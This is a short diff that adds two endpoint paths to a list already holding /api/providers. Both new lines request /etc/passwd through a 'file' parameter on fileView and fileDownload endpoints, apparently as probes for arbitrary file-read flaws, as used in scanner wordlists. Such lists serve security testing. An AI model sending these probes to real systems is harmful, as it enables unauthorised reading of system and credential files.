@@ -1,1 +1,4 @@
 /api/providers
+
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
